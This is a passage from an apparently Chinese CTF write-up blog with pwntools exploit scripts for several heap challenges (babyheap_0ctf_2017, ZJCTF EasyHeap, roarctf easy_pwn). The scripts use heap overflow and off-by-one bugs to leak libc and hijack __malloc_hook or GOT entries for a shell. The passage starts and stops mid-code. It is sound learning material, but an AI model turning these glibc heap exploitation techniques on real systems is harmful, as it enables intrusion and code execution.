Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>sleep(<span class="hljs-number">0xa</span>-<span class="hljs-number">0x5</span>)<br><span class="hljs-comment">#-------------------------------orw----------------------------------</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(alarm_addr)+p32(syscall)+p32(main_addr)+p32(data)+p32(<span class="hljs-number">0</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read_addr)+p32(main_addr)+p32(<span class="hljs-number">3</span>)+p32(data)+p32(<span class="hljs-number">0x30</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good Luck!\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(write_addr)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(data)+p32(<span class="hljs-number">0x30</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="SWPUCTF-2019-login">SWPUCTF_2019_login</h3><p>非栈上格式化字符串利用</p><p>如果堆题，保护got表可写，和没开pie的话，就是要用劫持got来做，show来泄露got得到libcbase</p><h3 id="babyheap-0ctf-2017-2">babyheap_0ctf_2017:</h3><h4 id="功能分析：">功能分析：</h4><p>常规菜单题，功能齐全</p><h4 id="漏洞点：堆溢出">漏洞点：堆溢出</h4><p>可以堆溢出，add函数和fill函数分开，fill填的大小没有检查。</p><h4 id="利用方法：">利用方法：</h4><p><strong>堆溢出-&gt;unsortbin  leak-&gt;堆分配至malloc_hook-&gt;劫持hook为og</strong></p><p>1.堆溢出修改chunk大小至少为0x91（unsortbin最小大小），free到unsortbin，unsortbin里fd和bk有指向main_areana+88地址，申请堆块，其地址会对应下移，申请堆块使其地址到一个正在使用的堆块，用show函数泄露了malloc_hook地址，再得出libc_base，libc_base+malloc,libc+og。</p><p>2.释放0x60堆块，运用堆溢出改free块的bin链到malloc_hook-0x23处，（libc2.23用0x7f绕过检查），申请两次后，申请堆块到malloc_hook-0x23处，填入og，最后申请add触发。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25542</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------</span><br><br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)) <br>free(<span class="hljs-number">1</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>dump(<span class="hljs-number">2</span>) <br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr) <br>libc_base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base) <br>hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <br>shell=libc_base+o_g_old[<span class="hljs-number">1</span>] <br><span class="hljs-comment">#------------------------------------------------------- </span><br>free(<span class="hljs-number">1</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>fill(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(shell)) <br>alloc(<span class="hljs-number">0x20</span>) <br><span class="hljs-comment">#gdb.attach(r) </span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap-2">[ZJCTF 2019]EasyHeap:</h3><h4 id="功能分析：-2">功能分析：</h4><p>有个system，没有show函数</p><h4 id="漏洞点：堆溢出-2">漏洞点：堆溢出</h4><p>堆溢出，add函数和fill函数size没有关联，保护措施Partial RELRO，got表可写，pie也没开，不用泄露libc基址了</p><h4 id="利用方法：-2">利用方法：</h4><p><strong>堆溢出-&gt;堆分配至heaparray-&gt;got表劫持为system</strong></p><p>这题有heaparray在bss段维护堆，利用堆溢出修改free的堆块的fd申请堆块到heaparray，用bss段的stdin的0x7f绕过fastbin检查</p><p>修改heaparray的指针指向free_got,free_got填入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29503</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>     sa(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0x6020c0</span>-<span class="hljs-number">0x13</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">0</span>,p64(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn：">roarctf_2019_easy_pwn：</h3><h4 id="功能分析：-3">功能分析：</h4><p>功能齐全，用heaparray结构体维护堆，</p><h4 id="漏洞点：of-by-one">漏洞点：of by one</h4><p>size在add和edit里关联起来了，但有个off by one，如果edit size大于add size=10能多输入个字节</p><h4 id="利用方法：-3">利用方法：</h4><p><strong>of by one -&gt;unsortbin leak-&gt;chunk复用-&gt;修改fastbin的fd 为malloc_hook-&gt;劫持malloc_hook为og</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26062</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><br><span class="hljs-comment">#-----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------</span><br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">2</span>)<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span><br>system=addr+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#---------------------------------</span><br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0x71</span>))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span>+p64(<span class="hljs-number">0x21</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>))<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">0x8</span>,p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(og)+p64(base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">14</span>))<br>add(<span class="hljs-number">0x66</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066</p><h3 id="bbbaby：">bbbaby：</h3><p>劫持__stack_chk_fail的got为main，执行我们rop链泄露libc，再劫持atoi的got为system</p><p>写入bin/sh</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 